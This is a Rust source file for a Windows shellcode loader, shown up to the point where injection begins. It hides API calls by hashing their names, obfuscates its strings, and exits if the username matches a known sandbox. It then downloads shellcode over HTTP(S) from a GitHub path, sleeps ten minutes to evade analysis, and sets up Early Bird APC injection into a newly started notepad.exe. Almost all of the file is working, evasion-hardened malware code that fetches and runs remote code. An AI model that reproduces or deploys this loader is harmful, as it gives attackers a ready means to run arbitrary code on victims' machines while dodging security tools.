#![no_main]
#![no_std]
#![windows_subsystem = "console"]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

extern crate alloc;

mod consts;
mod hashing;
mod iat;
mod obfuscation;
mod utils;

use alloc::{
    format,
    string::{String, ToString},
    vec,
    vec::Vec,
};
use core::{
    ffi::c_void,
    hash::{Hash, Hasher},
    hint::black_box,
    ptr,
};

use obfstr::obfstr;
use obfuscation::SafeSecret;
use rustc_hash::FxHasher;
use utils::{print_to_handle, zero_memory, Win32HeapAllocator};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, ERROR_ALREADY_EXISTS, INVALID_HANDLE_VALUE},
    System::{
        Console::{STD_ERROR_HANDLE, STD_OUTPUT_HANDLE},
        LibraryLoader::LoadLibraryA,
    },
    UI::WindowsAndMessaging::{MessageBoxW, MB_ICONERROR, MB_OK},
};
use zeroize::Zeroize;

use crate::hashing::{const_hash, get_proc_address_h, runtime_hash};

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

#[global_allocator]
static ALLOCATOR: Win32HeapAllocator = Win32HeapAllocator;

#[inline(always)]
unsafe fn try_fetch_shellcode(
    winhttp_open: CustomWinHttpOpen,
    winhttp_connect: CustomWinHttpConnect,
    winhttp_close_handle: CustomWinHttpCloseHandle,
    winhttp_open_request: CustomWinHttpOpenRequest,
    winhttp_send_request: CustomWinHttpSendRequest,
    winhttp_receive_response: CustomWinHttpReceiveResponse,
    winhttp_query_headers: CustomWinHttpQueryHeaders,
    winhttp_read_data: CustomWinHttpReadData,
    port: u16,
    flags: u32,
) -> Option<Vec<u8>> {
    let h_session = unsafe {
        winhttp_open(
            ptr::null(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        )
    };
    if h_session == core::ptr::null_mut() {
        return None;
    }

    let mut server_name: Vec<u16> = obfstr!("github.com\0").encode_utf16().collect();
    let h_connect = unsafe { winhttp_connect(h_session, server_name.as_ptr(), port, 0) };

    unsafe {
        zero_memory(server_name.as_mut_ptr() as *mut u8, server_name.len() * 2);
    }

    if h_connect == core::ptr::null_mut() {
        unsafe { winhttp_close_handle(h_session) };
        return None;
    }

    let mut path: Vec<u16> = obfstr!("/peterferrie/win-exec-calc-shellcode/raw/refs/heads/master/build/bin/win-exec-calc-shellcode.bin\0").encode_utf16().collect();
    let h_request = unsafe {
        winhttp_open_request(
            h_connect,
            ptr::null(),
            path.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            flags,
        )
    };

    unsafe {
        zero_memory(path.as_mut_ptr() as *mut u8, path.len() * 2);
    }

    if h_request == core::ptr::null_mut() {
        unsafe {
            winhttp_close_handle(h_connect);
            winhttp_close_handle(h_session);
        }
        return None;
    }

    let sent = unsafe { winhttp_send_request(h_request, ptr::null(), 0, ptr::null(), 0, 0, 0) };

    let mut shellcode_data: Vec<u8> = Vec::new();

    if sent == 1 {
        let received = unsafe { winhttp_receive_response(h_request, ptr::null_mut()) };
        if received == 1 {
            let mut status_code: u32 = 0;
            let mut size = core::mem::size_of::<u32>() as u32;

            unsafe {
                winhttp_query_headers(
                    h_request,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    ptr::null(),
                    &mut status_code as *mut _ as *mut c_void,
                    &mut size,
                    ptr::null_mut(),
                );
            }

            if status_code == 200 {
                let mut buffer = [0u8; 4096];
                let mut bytes_read = 0;

                loop {
                    let success = unsafe {
                        winhttp_read_data(
                            h_request,
                            buffer.as_mut_ptr() as *mut c_void,
                            buffer.len() as u32,
                            &mut bytes_read,
                        )
                    };

                    if success == 0 || bytes_read == 0 {
                        break;
                    }

                    shellcode_data.extend_from_slice(&buffer[..bytes_read as usize]);

                    unsafe {
                        zero_memory(buffer.as_mut_ptr(), bytes_read as usize);
                    }
                }
            }
        }
    }

    unsafe {
        winhttp_close_handle(h_request);
        winhttp_close_handle(h_connect);
        winhttp_close_handle(h_session);
    }

    if shellcode_data.is_empty() {
        None
    } else {
        Some(shellcode_data)
    }
}

#[inline(always)]
unsafe fn winhttp_get_shellcode() -> Option<Vec<u8>> {
    let h_winhttp = unsafe { LoadLibraryA(b"winhttp.dll\0".as_ptr()) };
    if h_winhttp == core::ptr::null_mut() {
        return None;
    }

    let winhttp_open_ptr = get_proc_address_h(h_winhttp as _, WINHTTPOPEN_HASH);
    let winhttp_connect_ptr = get_proc_address_h(h_winhttp as _, WINHTTPCONNECT_HASH);
    let winhttp_close_handle_ptr = get_proc_address_h(h_winhttp as _, WINHTTPCLOSEHANDLE_HASH);
    let winhttp_open_request_ptr = get_proc_address_h(h_winhttp as _, WINHTTPOPENREQUEST_HASH);
    let winhttp_send_request_ptr = get_proc_address_h(h_winhttp as _, WINHTTPSENDREQUEST_HASH);
    let winhttp_receive_response_ptr =
        get_proc_address_h(h_winhttp as _, WINHTTPRECEIVERESPONSE_HASH);
    let winhttp_query_headers_ptr = get_proc_address_h(h_winhttp as _, WINHTTPQUERYHEADERS_HASH);
    let winhttp_read_data_ptr = get_proc_address_h(h_winhttp as _, WINHTTPREADDATA_HASH);

    if winhttp_open_ptr.is_none()
        || winhttp_connect_ptr.is_none()
        || winhttp_close_handle_ptr.is_none()
        || winhttp_open_request_ptr.is_none()
        || winhttp_send_request_ptr.is_none()
        || winhttp_receive_response_ptr.is_none()
        || winhttp_query_headers_ptr.is_none()
        || winhttp_read_data_ptr.is_none()
    {
        return None;
    }

    let winhttp_open: CustomWinHttpOpen =
        unsafe { core::mem::transmute(winhttp_open_ptr.unwrap()) };
    let winhttp_connect: CustomWinHttpConnect =
        unsafe { core::mem::transmute(winhttp_connect_ptr.unwrap()) };
    let winhttp_close_handle: CustomWinHttpCloseHandle =
        unsafe { core::mem::transmute(winhttp_close_handle_ptr.unwrap()) };
    let winhttp_open_request: CustomWinHttpOpenRequest =
        unsafe { core::mem::transmute(winhttp_open_request_ptr.unwrap()) };
    let winhttp_send_request: CustomWinHttpSendRequest =
        unsafe { core::mem::transmute(winhttp_send_request_ptr.unwrap()) };
    let winhttp_receive_response: CustomWinHttpReceiveResponse =
        unsafe { core::mem::transmute(winhttp_receive_response_ptr.unwrap()) };
    let winhttp_query_headers: CustomWinHttpQueryHeaders =
        unsafe { core::mem::transmute(winhttp_query_headers_ptr.unwrap()) };
    let winhttp_read_data: CustomWinHttpReadData =
        unsafe { core::mem::transmute(winhttp_read_data_ptr.unwrap()) };

    let https_result = unsafe {
        try_fetch_shellcode(
            winhttp_open,
            winhttp_connect,
            winhttp_close_handle,
            winhttp_open_request,
            winhttp_send_request,
            winhttp_receive_response,
            winhttp_query_headers,
            winhttp_read_data,
            INTERNET_DEFAULT_HTTPS_PORT,
            WINHTTP_FLAG_SECURE,
        )
    };

    if https_result.is_some() {
        return https_result;
    }

    unsafe {
        try_fetch_shellcode(
            winhttp_open,
            winhttp_connect,
            winhttp_close_handle,
            winhttp_open_request,
            winhttp_send_request,
            winhttp_receive_response,
            winhttp_query_headers,
            winhttp_read_data,
            INTERNET_DEFAULT_HTTP_PORT,
            0,
        )
    }
}

#[inline(always)]
unsafe fn earlybird_inject(shellcode: &[u8]) -> bool {
    let mut debug_msg = SafeSecret::new(format!("{}\n", obfstr!("[i] Resolving APIs...")));
    let revealed = debug_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed);
    drop(revealed);
    debug_msg.zeroize();

    let h_kernel32 = unsafe { LoadLibraryA(b"kernel32.dll\0".as_ptr()) };
    if h_kernel32 == core::ptr::null_mut() {
        let mut err_msg =
            SafeSecret::new(format!("{}\n", obfstr!("[!] Failed to load kernel32.dll")));
        let revealed_err = err_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_err);
        drop(revealed_err);
        err_msg.zeroize();
        return false;
    }

    let create_process_a_ptr = get_proc_address_h(h_kernel32 as _, CREATEPROCESSA_HASH);
    let virtual_alloc_ex_ptr = get_proc_address_h(h_kernel32 as _, VIRTUALALLOCEX_HASH);
    let write_process_memory_ptr = get_proc_address_h(h_kernel32 as _, WRITEPROCESSMEMORY_HASH);
    let virtual_protect_ex_ptr = get_proc_address_h(h_kernel32 as _, VIRTUALPROTECTEX_HASH);
    let queue_user_apc_ptr = get_proc_address_h(h_kernel32 as _, QUEUEUSERAPC_HASH);
    let debug_active_process_stop_ptr =
        get_proc_address_h(h_kernel32 as _, DEBUGACTIVEPROCESSSTOP_HASH);
    let resume_thread_ptr = get_proc_address_h(h_kernel32 as _, RESUMETHREAD_HASH);
    let get_environment_variable_a_ptr =
        get_proc_address_h(h_kernel32 as _, GETENVIRONMENTVARIABLEA_HASH);
    let close_handle_ptr = get_proc_address_h(h_kernel32 as _, CLOSEHANDLE_HASH);

    if create_process_a_ptr.is_none()
        || virtual_alloc_ex_ptr.is_none()
        || write_process_memory_ptr.is_none()
        || virtual_protect_ex_ptr.is_none()
        || queue_user_apc_ptr.is_none()
        || debug_active_process_stop_ptr.is_none()
        || resume_thread_ptr.is_none()
        || get_environment_variable_a_ptr.is_none()
        || close_handle_ptr.is_none()
    {
        let mut err_msg = SafeSecret::new(format!(
            "{}\n",
            obfstr!("[!] Failed to resolve one or more APIs")
        ));
        let revealed_err = err_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_err);
        drop(revealed_err);
        err_msg.zeroize();
        return false;
    }

    let mut ok_msg = SafeSecret::new(format!("{}\n", obfstr!("[+] APIs resolved successfully")));
    let revealed_ok = ok_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_ok);
    drop(revealed_ok);
    ok_msg.zeroize();

    let create_process_a: CustomCreateProcessA =
        unsafe { core::mem::transmute(create_process_a_ptr.unwrap()) };
    let virtual_alloc_ex: CustomVirtualAllocEx =
        unsafe { core::mem::transmute(virtual_alloc_ex_ptr.unwrap()) };
    let write_process_memory: CustomWriteProcessMemory =
        unsafe { core::mem::transmute(write_process_memory_ptr.unwrap()) };
    let virtual_protect_ex: CustomVirtualProtectEx =
        unsafe { core::mem::transmute(virtual_protect_ex_ptr.unwrap()) };
    let queue_user_apc: CustomQueueUserAPC =
        unsafe { core::mem::transmute(queue_user_apc_ptr.unwrap()) };
    let debug_active_process_stop: CustomDebugActiveProcessStop =
        unsafe { core::mem::transmute(debug_active_process_stop_ptr.unwrap()) };
    let resume_thread: CustomResumeThread =
        unsafe { core::mem::transmute(resume_thread_ptr.unwrap()) };
    let get_environment_variable_a: CustomGetEnvironmentVariableA =
        unsafe { core::mem::transmute(get_environment_variable_a_ptr.unwrap()) };
    let close_handle: CustomCloseHandle =
        unsafe { core::mem::transmute(close_handle_ptr.unwrap()) };

    let mut windir = [0u8; 260];
    let env_len =
        unsafe { get_environment_variable_a(b"WINDIR\0".as_ptr(), windir.as_mut_ptr(), 260) };

    if env_len == 0 {
        let mut err_msg = SafeSecret::new(format!(
            "{}\n",
            obfstr!("[!] Failed to get WINDIR environment variable")
        ));
        let revealed_err = err_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_err);
        drop(revealed_err);
        err_msg.zeroize();
        return false;
    }

    let windir_len = windir
        .iter()
        .position(|&x| x == 0)
        .unwrap_or(env_len as usize);
    let mut path_bytes: Vec<u8> = Vec::with_capacity(windir_len + 20);
    path_bytes.extend_from_slice(&windir[..windir_len]);
    path_bytes.extend_from_slice(b"\\System32\\notepad.exe\0");

    let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;

    let mut debug_msg2 = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[i] Creating notepad.exe as debugged process...")
    ));
    let revealed2 = debug_msg2.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed2);
    drop(revealed2);
    debug_msg2.zeroize();

    let created = unsafe {
        create_process_a(
            ptr::null(),
            path_bytes.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            0,
            DEBUG_PROCESS,
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi,
        )
    };

    unsafe {
        zero_memory(path_bytes.as_mut_ptr(), path_bytes.len());
    }

    if created == 0 || pi.hProcess == core::ptr::null_mut() || pi.hThread == core::ptr::null_mut() {
        let mut err_msg = SafeSecret::new(format!(
            "{} {}\n",
            obfstr!("[!] CreateProcessA failed. Error:"),
            unsafe { GetLastError() }
        ));
        let revealed_err = err_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_err);
        drop(revealed_err);
        err_msg.zeroize();
        return false;
    }

    let mut pid_msg = SafeSecret::new(format!(
        "{} {}\n",
        obfstr!("[+] Process created with PID:"),
        pi.dwProcessId
    ));
    let revealed_pid = pid_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_pid);
    drop(revealed_pid);
    pid_msg.zeroize();

    let remote_addr = unsafe {
        virtual_alloc_ex(
            pi.hProcess,
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_addr == core::ptr::null_mut() {
        let mut err_msg = SafeSecret::new(format!(
            "{} {}\n",
            obfstr!("[!] VirtualAllocEx failed. Error:"),
            unsafe { GetLastError() }
        ));
        let revealed_err = err_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_err);
        drop(revealed_err);
        err_msg.zeroize();
        unsafe {
            close_handle(pi.hProcess);
            close_handle(pi.hThread);
        }
        return false;
    }

    let mut alloc_msg = SafeSecret::new(format!(
        "{} {:?}\n",
        obfstr!("[+] Memory allocated at:"),
        remote_addr
    ));
    let revealed_alloc = alloc_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_alloc);
    drop(revealed_alloc);
    alloc_msg.zeroize();

    let mut write_msg = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[i] Writing shellcode to remote process...")
    ));
    let revealed_write = write_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_write);
    drop(revealed_write);
    write_msg.zeroize();

    let mut written: usize = 0;
    let write_success = unsafe {
        write_process_memory(
            pi.hProcess,
            remote_addr,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            &mut written,
        )
    };

    if write_success == 0 || written != shellcode.len() {
        let mut err_msg = SafeSecret::new(format!(
            "{} {}\n",
            obfstr!("[!] WriteProcessMemory failed. Error:"),
            unsafe { GetLastError() }
        ));
        let revealed_err = err_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_err);
        drop(revealed_err);
        err_msg.zeroize();
        unsafe {
            close_handle(pi.hProcess);
            close_handle(pi.hThread);
        }
        return false;
    }

    let mut written_msg = SafeSecret::new(format!(
        "{} {} {}\n",
        obfstr!("[+] Successfully written"),
        written,
        obfstr!("bytes")
    ));
    let revealed_written = written_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_written);
    drop(revealed_written);
    written_msg.zeroize();

    let mut protect_msg = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[i] Changing memory protection to RX...")
    ));
    let revealed_protect = protect_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_protect);
    drop(revealed_protect);
    protect_msg.zeroize();

    let mut old_protect: u32 = 0;
    let protect_success = unsafe {
        virtual_protect_ex(
            pi.hProcess,
            remote_addr,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };

    if protect_success == 0 {
        let mut err_msg = SafeSecret::new(format!(
            "{} {}\n",
            obfstr!("[!] VirtualProtectEx failed. Error:"),
            unsafe { GetLastError() }
        ));
        let revealed_err = err_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_err);
        drop(revealed_err);
        err_msg.zeroize();
        unsafe {
            close_handle(pi.hProcess);
            close_handle(pi.hThread);
        }
        return false;
    }

    let mut rx_msg = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[+] Memory protection changed to PAGE_EXECUTE_READWRITE")
    ));
    let revealed_rx = rx_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_rx);
    drop(revealed_rx);
    rx_msg.zeroize();

    let mut apc_msg = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[i] Queueing APC and detaching debugger...")
    ));
    let revealed_apc = apc_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_apc);
    drop(revealed_apc);
    apc_msg.zeroize();

    unsafe {
        queue_user_apc(remote_addr, pi.hThread, 0);
        debug_active_process_stop(pi.dwProcessId);
        resume_thread(pi.hThread);
        close_handle(pi.hProcess);
        close_handle(pi.hThread);
    }

    let mut done_msg = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[+] Injection complete! Shellcode should be executing.")
    ));
    let revealed_done = done_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_done);
    drop(revealed_done);
    done_msg.zeroize();

    true
}

const CLOSEHANDLE_HASH: u32 = const_hash(b"CloseHandle");
type CustomCloseHandle = unsafe extern "system" fn(hObject: *mut c_void) -> i32;

// --- FUNCTION SIGNATURES ---
type CustomGetUserNameW = unsafe extern "system" fn(lpBuffer: *mut u16, lpnSize: *mut u32) -> i32;
type CustomCreateMutexW = unsafe extern "system" fn(
    lpMutexAttributes: *const c_void,
    bInitialOwner: i32,
    lpName: *const u16,
) -> *mut c_void;
type CustomSleep = unsafe extern "system" fn(dwMilliseconds: u32);

type CustomWinHttpOpen = unsafe extern "system" fn(
    pszAgentW: *const u16,
    dwAccessType: u32,
    pszProxyW: *const u16,
    pszProxyBypassW: *const u16,
    dwFlags: u32,
) -> *mut c_void;
type CustomWinHttpConnect = unsafe extern "system" fn(
    hSession: *mut c_void,
    pswzServerName: *const u16,
    nServerPort: u16,
    dwReserved: u32,
) -> *mut c_void;
type CustomWinHttpCloseHandle = unsafe extern "system" fn(hInternet: *mut c_void) -> i32;
type CustomWinHttpOpenRequest = unsafe extern "system" fn(
    hConnect: *mut c_void,
    pwszVerb: *const u16,
    pwszObjectName: *const u16,
    pwszVersion: *const u16,
    pwszReferrer: *const u16,
    ppwszAcceptTypes: *const *const u16,
    dwFlags: u32,
) -> *mut c_void;
type CustomWinHttpSendRequest = unsafe extern "system" fn(
    hRequest: *mut c_void,
    lpszHeaders: *const u16,
    dwHeadersLength: u32,
    lpOptional: *const c_void,
    dwOptionalLength: u32,
    dwTotalLength: u32,
    dwContext: usize,
) -> i32;
type CustomWinHttpReceiveResponse =
    unsafe extern "system" fn(hRequest: *mut c_void, lpReserved: *mut c_void) -> i32;
type CustomWinHttpQueryHeaders = unsafe extern "system" fn(
    hRequest: *mut c_void,
    dwInfoLevel: u32,
    pwszName: *const u16,
    lpBuffer: *mut c_void,
    lpdwBufferLength: *mut u32,
    lpdwIndex: *mut u32,
) -> i32;
type CustomWinHttpReadData = unsafe extern "system" fn(
    hFile: *mut c_void,
    lpBuffer: *mut c_void,
    dwNumberOfBytesToRead: u32,
    lpdwNumberOfBytesRead: *mut u32,
) -> i32;

const GETUSERNAMEW_HASH: u32 = const_hash(b"GetUserNameW");
const CREATEMUTEXW_HASH: u32 = const_hash(b"CreateMutexW");
const SLEEP_HASH: u32 = const_hash(b"Sleep");
const WINHTTPOPEN_HASH: u32 = const_hash(b"WinHttpOpen");
const WINHTTPCONNECT_HASH: u32 = const_hash(b"WinHttpConnect");
const WINHTTPCLOSEHANDLE_HASH: u32 = const_hash(b"WinHttpCloseHandle");
const WINHTTPOPENREQUEST_HASH: u32 = const_hash(b"WinHttpOpenRequest");
const WINHTTPSENDREQUEST_HASH: u32 = const_hash(b"WinHttpSendRequest");
const WINHTTPRECEIVERESPONSE_HASH: u32 = const_hash(b"WinHttpReceiveResponse");
const WINHTTPQUERYHEADERS_HASH: u32 = const_hash(b"WinHttpQueryHeaders");
const WINHTTPREADDATA_HASH: u32 = const_hash(b"WinHttpReadData");

const INTERNET_DEFAULT_HTTP_PORT: u16 = 80;
const INTERNET_DEFAULT_HTTPS_PORT: u16 = 443;
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;

const CREATEPROCESSA_HASH: u32 = const_hash(b"CreateProcessA");
const VIRTUALALLOCEX_HASH: u32 = const_hash(b"VirtualAllocEx");
const WRITEPROCESSMEMORY_HASH: u32 = const_hash(b"WriteProcessMemory");
const VIRTUALPROTECTEX_HASH: u32 = const_hash(b"VirtualProtectEx");
const QUEUEUSERAPC_HASH: u32 = const_hash(b"QueueUserAPC");
const DEBUGACTIVEPROCESSSTOP_HASH: u32 = const_hash(b"DebugActiveProcessStop");
const RESUMETHREAD_HASH: u32 = const_hash(b"ResumeThread");
const GETENVIRONMENTVARIABLEA_HASH: u32 = const_hash(b"GetEnvironmentVariableA");

type CustomCreateProcessA = unsafe extern "system" fn(
    lpApplicationName: *const u8,
    lpCommandLine: *mut u8,
    lpProcessAttributes: *const c_void,
    lpThreadAttributes: *const c_void,
    bInheritHandles: i32,
    dwCreationFlags: u32,
    lpEnvironment: *const c_void,
    lpCurrentDirectory: *const u8,
    lpStartupInfo: *const STARTUPINFOA,
    lpProcessInformation: *mut PROCESS_INFORMATION,
) -> i32;

#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct STARTUPINFOA {
    pub cb: u32,
    pub lpReserved: *const u8,
    pub lpDesktop: *const u8,
    pub lpTitle: *const u8,
    pub dwX: u32,
    pub dwY: u32,
    pub dwXSize: u32,
    pub dwYSize: u32,
    pub dwXCountChars: u32,
    pub dwYCountChars: u32,
    pub dwFillAttribute: u32,
    pub dwFlags: u32,
    pub wShowWindow: u16,
    pub cbReserved2: u16,
    pub lpReserved2: *mut u8,
    pub hStdInput: *mut c_void,
    pub hStdOutput: *mut c_void,
    pub hStdError: *mut c_void,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct PROCESS_INFORMATION {
    pub hProcess: *mut c_void,
    pub hThread: *mut c_void,
    pub dwProcessId: u32,
    pub dwThreadId: u32,
}

type CustomVirtualAllocEx = unsafe extern "system" fn(
    hProcess: *mut c_void,
    lpAddress: *mut c_void,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> *mut c_void;

type CustomWriteProcessMemory = unsafe extern "system" fn(
    hProcess: *mut c_void,
    lpBaseAddress: *mut c_void,
    lpBuffer: *const c_void,
    nSize: usize,
    lpNumberOfBytesWritten: *mut usize,
) -> i32;

type CustomVirtualProtectEx = unsafe extern "system" fn(
    hProcess: *mut c_void,
    lpAddress: *mut c_void,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> i32;

type CustomQueueUserAPC = unsafe extern "system" fn(
    lpStartAddress: *mut c_void,
    hThread: *mut c_void,
    dwData: usize,
) -> i32;

type CustomDebugActiveProcessStop = unsafe extern "system" fn(dwProcessId: u32) -> i32;

type CustomResumeThread = unsafe extern "system" fn(hThread: *mut c_void) -> u32;

type CustomGetEnvironmentVariableA =
    unsafe extern "system" fn(lpName: *const u8, lpBuffer: *mut u8, nSize: u32) -> u32;

const DEBUG_PROCESS: u32 = 0x00000001;
const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

#[inline(always)]
fn get_username() -> Option<String> {
    let mut size: u32 = black_box(0x15A) ^ black_box(0x5A);
    let mut buffer = vec![0u16; size as usize];

    unsafe {
        let h_advapi32 = LoadLibraryA(b"advapi32.dll\0".as_ptr());
        if h_advapi32 == core::ptr::null_mut() {
            return None;
        }
        let get_user_name_w_ptr = get_proc_address_h(h_advapi32 as _, GETUSERNAMEW_HASH);
        if let Some(f) = get_user_name_w_ptr {
            let func: CustomGetUserNameW = core::mem::transmute(f);
            if func(buffer.as_mut_ptr(), &mut size) != 0 {
                if size > 0 {
                    return String::from_utf16(&buffer[..(size as usize - 1)]).ok();
                }
            }
        }
    }
    None
}

#[inline(always)]
fn wide_hash_manual(input: &str) -> Vec<u16> {
    let mut hasher = FxHasher::default();
    input.hash(&mut hasher);
    let hash_val = hasher.finish();
    let mut wide_string = Vec::with_capacity(16);
    let hex_digits = [
        '0' as u16, '1' as u16, '2' as u16, '3' as u16, '4' as u16, '5' as u16, '6' as u16,
        '7' as u16, '8' as u16, '9' as u16, 'a' as u16, 'b' as u16, 'c' as u16, 'd' as u16,
        'e' as u16, 'f' as u16,
    ];
    for i in (0..16).rev() {
        let nibble = (hash_val >> (i * 4)) & 0xf;
        wide_string.push(hex_digits[nibble as usize]);
    }
    wide_string
}

#[unsafe(no_mangle)]
pub extern "system" fn mainCRTStartup() {
    consts::call_random_iat_functions();

    let mut user_secret = get_username()
        .map(SafeSecret::new)
        .unwrap_or_else(|| SafeSecret::new(obfstr!("UnknownUser").to_string()));
    let user_str = user_secret.reveal();
    let mut hashed_u16 = wide_hash_manual(&user_str);

    let username_bytes = user_str.as_bytes();
    let username_hash = runtime_hash(username_bytes);
    let is_sandbox = consts::SANDBOX_USERNAME_HASHES.contains(&username_hash);

    if is_sandbox {
        let msg: Vec<u16> = obfstr!("Sandbox detected.")
            .encode_utf16()
            .chain(core::iter::once(0))
            .collect();
        let caption: Vec<u16> = obfstr!("Error")
            .encode_utf16()
            .chain(core::iter::once(0))
            .collect();
        unsafe {
            MessageBoxW(
                core::ptr::null_mut(),
                msg.as_ptr(),
                caption.as_ptr(),
                MB_OK | MB_ICONERROR,
            );
            zero_memory(hashed_u16.as_mut_ptr() as *mut u8, hashed_u16.len() * 2);
        }
        user_secret.zeroize();
        unsafe { windows_sys::Win32::System::Threading::ExitProcess(0) };
    }

    let mut hash_display = SafeSecret::new(String::from_utf16_lossy(&hashed_u16));

    unsafe {
        zero_memory(hashed_u16.as_mut_ptr() as *mut u8, hashed_u16.len() * 2);
    }
    user_secret.zeroize();

    let mut mutex_name_str = {
        let revealed_hash = hash_display.reveal();
        let s = SafeSecret::new(format!("{}-{}\0", obfstr!("APP"), *revealed_hash));
        drop(revealed_hash);
        s
    };
    let mut mutex_name_wide: Vec<u16> = mutex_name_str.reveal().encode_utf16().collect();

    let mut mutex_log = {
        let revealed_mutex = mutex_name_str.reveal();
        let s = SafeSecret::new(format!(
            "{} {}\n",
            obfstr!("Generated Mutex Name:"),
            revealed_mutex.trim_end_matches('\0')
        ));
        drop(revealed_mutex);
        s
    };
    let revealed_log = mutex_log.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_log);
    drop(revealed_log);
    mutex_log.zeroize();

    let handle = unsafe {
        let h_kernel32 = LoadLibraryA(b"kernel32.dll\0".as_ptr());
        if h_kernel32 == core::ptr::null_mut() {
            windows_sys::Win32::System::Threading::ExitProcess(0);
        }
        let create_mutex_w_ptr = get_proc_address_h(h_kernel32 as _, CREATEMUTEXW_HASH);
        let h = if let Some(f) = create_mutex_w_ptr {
            let func: CustomCreateMutexW = core::mem::transmute(f);
            func(
                ptr::null(),
                black_box(0xFB) ^ black_box(0xFA),
                mutex_name_wide.as_ptr(),
            )
        } else {
            core::ptr::null_mut()
        };

        zero_memory(
            mutex_name_wide.as_mut_ptr() as *mut u8,
            mutex_name_wide.len() * 2,
        );
        mutex_name_str.zeroize();
        hash_display.zeroize();

        if h == core::ptr::null_mut() || h == INVALID_HANDLE_VALUE as _ {
            windows_sys::Win32::System::Threading::ExitProcess(0);
        }

        if GetLastError() == ERROR_ALREADY_EXISTS {
            let mut err_msg = SafeSecret::new(format!(
                "{}\n",
                obfstr!("Error: Instance already running for this user.")
            ));
            let revealed_err = err_msg.reveal();
            print_to_handle(STD_ERROR_HANDLE, &revealed_err);
            drop(revealed_err);
            err_msg.zeroize();

            CloseHandle(h);
            windows_sys::Win32::System::Threading::ExitProcess(0);
        }
        h
    };

    let mut unique_msg = SafeSecret::new(format!("{}\n", obfstr!("Unique. Fetching shellcode...")));
    let revealed_unique = unique_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_unique);
    drop(revealed_unique);
    unique_msg.zeroize();

    let shellcode = unsafe { winhttp_get_shellcode() };

    if shellcode.is_none() {
        let mut no_shellcode_msg =
            SafeSecret::new(format!("{}\n", obfstr!("Failed to fetch shellcode.")));
        let revealed_no_shellcode = no_shellcode_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_no_shellcode);
        drop(revealed_no_shellcode);
        no_shellcode_msg.zeroize();
        unsafe {
            CloseHandle(handle);
            windows_sys::Win32::System::Threading::ExitProcess(0);
        }
    }

    let mut sleep_msg = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[i] Shellcode fetched. Sleeping for 10 minutes before injection...")
    ));
    let revealed_sleep = sleep_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_sleep);
    drop(revealed_sleep);
    sleep_msg.zeroize();

    unsafe {
        let h_kernel32 = LoadLibraryA(b"kernel32.dll\0".as_ptr());
        if h_kernel32 != core::ptr::null_mut() {
            let sleep_ptr = get_proc_address_h(h_kernel32 as _, SLEEP_HASH);
            if let Some(f) = sleep_ptr {
                let func: CustomSleep = core::mem::transmute(f);
                func((black_box(0x2C) ^ black_box(0x26)) * 60 * 1000);
            }
        }
    }

    let mut inject_msg = SafeSecret::new(format!(
        "{}\n",
        obfstr!("[i] Sleep complete. Starting injection...")
    ));
    let revealed_inject = inject_msg.reveal();
    print_to_handle(STD_OUTPUT_HANDLE, &revealed_inject);
    drop(revealed_inject);
    inject_msg.zeroize();

